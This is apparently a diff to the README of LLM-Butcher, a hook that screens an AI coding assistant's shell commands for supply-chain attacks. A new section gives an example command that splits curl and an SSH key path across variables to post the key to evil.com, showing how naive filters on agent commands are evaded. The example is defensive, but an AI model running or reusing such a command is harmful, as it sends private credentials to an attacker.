@@ -4,6 +4,14 @@
   <img src="llm-butcher-cover.jpg" alt="LLM-Butcher" width="100%">
 </p>
 
+<p align="center">
+  <a href="https://www.npmjs.com/package/llm-butcher"><img src="https://img.shields.io/npm/v/llm-butcher.svg" alt="npm version"></a>
+  <a href="https://github.com/ipodishima/llm-butcher/blob/main/LICENSE"><img src="https://img.shields.io/npm/l/llm-butcher.svg" alt="license"></a>
+  <a href="https://www.npmjs.com/package/llm-butcher"><img src="https://img.shields.io/npm/dm/llm-butcher.svg" alt="downloads"></a>
+  <a href="https://github.com/ipodishima/llm-butcher"><img src="https://img.shields.io/badge/rules-114-blue.svg" alt="rules"></a>
+  <a href="https://github.com/ipodishima/llm-butcher"><img src="https://img.shields.io/badge/tests-203-brightgreen.svg" alt="tests"></a>
+</p>
+
 A security layer between AI coding assistants and your terminal.
 
 LLM-Butcher intercepts shell commands before execution and checks whether the targets — domains, scripts, and packages — are actually trustworthy. It catches supply chain attacks like [GhostClaw](https://www.jamf.com/blog/ghostclaw-ghostloader-malware-github-repositories-ai-workflows/) that exploit the trust developers place in README install instructions.
@@ -91,11 +99,13 @@ Legit npm install              PASSED     0
 
 ## How It Works
 
-LLM-Butcher runs as a **PreToolUse hook** in Claude Code. When Claude Code is about to run a shell command, LLM-Butcher intercepts it and runs three checks in parallel:
+LLM-Butcher runs as a **PreToolUse hook** in Claude Code. When Claude Code is about to run a shell command, LLM-Butcher intercepts it and runs four checks:
 
-### 1. Script Pre-Analysis
+### 1. Command & Script Analysis (114 rules across 9 YAML packs)
 
-When a command pipes a URL to `sh`/`bash` (`curl | sh`), LLM-Butcher downloads the script to memory and scans for 17 malicious patterns:
+All detection rules are defined in [Nuclei-inspired YAML files](src/rules/packs/) — easy to read, extend, and contribute to. Run `llm-butcher --list-rules` to see all loaded rules.
+
+When a command pipes a URL to `sh`/`bash` (`curl | sh`), LLM-Butcher also downloads the script to memory and scans it. Examples of what gets caught:
 
 | Pattern | What it catches |
 |---------|----------------|
@@ -124,24 +134,35 @@ For `npm install`, `pip install`, `brew install`, `yarn add`, `pnpm add`:
 - **Registry verification** — checks if the package actually exists in the registry (npm, PyPI)
 - Flags packages that are 1-2 characters away from a popular package
 
+### 4. Shell Variable Resolution
+
+Attackers can split commands across variables to bypass regex detection:
+
+```bash
+# This bypasses naive pattern matching — no known-bad string appears intact
+c=curl; d=$HOME/.ssh/id_rsa; $c -d @$d evil.com
+```
+
+LLM-Butcher resolves variable assignments, reconstructs the actual command, and re-scans it. It also scores commands for obfuscation indicators (single-letter variables, concatenated command names, `eval` with interpolation) and flags suspicious patterns.
+
+### 5. Output Formats
+
+- `--output text` (default) — human-readable stderr output for hook mode
+- `--output sarif` — [SARIF v2.1.0](https://sarifweb.azurewebsites.net/) JSON for GitHub Code Scanning / CI pipelines
+- `--output json` — raw JSON results for scripting
+
 ## Installation
 
-### From npm (when published)
+### From npm
 
 ```bash
 npm install -g llm-butcher
 ```
 
-### From GitHub
-
-```bash
-npm install -g github:your-username/llm-butcher
-```
-
 ### From source
 
 ```bash
-git clone https://github.com/your-username/llm-butcher.git
+git clone https://github.com/ipodishima/llm-butcher.git
 cd llm-butcher
 npm install
 npm run build
@@ -199,7 +220,7 @@ You can test LLM-Butcher against safe, simulated attack scenarios without instal
 ### Quick demo (automated)
 
 ```bash
-git clone https://github.com/your-username/llm-butcher.git
+git clone https://github.com/ipodishima/llm-butcher.git
 cd llm-butcher
 npm install
 npm run build
@@ -288,6 +309,10 @@ LLM-Butcher works out of the box with sensible defaults. To customize, create `~
   },
   "severity": {
     "blockThreshold": "high"
+  },
+  "rules": {
+    "disabledPacks": [],
+    "disabledRules": []
   }
 }
 ```
@@ -308,7 +333,7 @@ Set `blockThreshold` to `"critical"` for a more permissive mode, or `"medium"` f
 ```bash
 npm install          # Install dependencies
 npm run build        # Build for distribution
-npm test             # Run all tests (77 unit + E2E tests)
+npm test             # Run all 203 tests
 npm run test:e2e     # Run E2E scenarios only
 npm run demo         # Run the visual demo
 npm run test:server  # Start fixture server for manual testing
@@ -347,11 +372,10 @@ LLM-Butcher was built to catch exactly this class of attack.
 
 This project started as an MVP from a developer who got scared by a real attack. There's a lot of room for improvement:
 
-- More malicious patterns to detect
+- More detection rules — just add a YAML file to `src/rules/packs/`
 - Support for more AI coding tools (Cursor, Windsurf, Copilot)
-- Smarter script analysis (AST parsing instead of regex)
 - GitHub repo reputation checks (star history, commit patterns)
-- Community-maintained blocklists
+- Community-maintained blocklists and custom rule packs
 - Better typosquat dictionaries
 
 If you have cybersecurity expertise, your input is especially valuable. Open an issue, submit a PR, or just tell me what I'm missing.
